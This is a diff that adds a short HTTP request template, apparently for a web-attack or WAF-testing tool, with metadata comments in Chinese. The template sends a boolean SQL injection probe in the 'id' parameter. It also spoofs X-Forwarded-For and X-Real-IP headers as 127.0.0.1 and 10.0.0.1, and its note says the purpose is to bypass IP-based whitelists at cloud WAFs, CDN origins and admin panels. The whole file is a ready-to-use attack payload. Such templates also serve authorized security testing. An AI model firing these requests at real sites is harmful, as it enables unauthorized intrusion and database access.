@@ -1,0 +1,15 @@
+# @name: X-Forwarded-For 信任绕过
+# @tags: get,sqli,header,xff,trust,id,bypass
+# @color: amber
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: header_xff_spoof
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 伪造 X-Forwarded-For/X-Real-IP 为 127.0.0.1/内网地址，绕过基于来源 IP 的白名单或信任列表（部分云 WAF、CDN 回源信任、管理后台）。
+GET /?id=1'+and+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 10.0.0.1
+
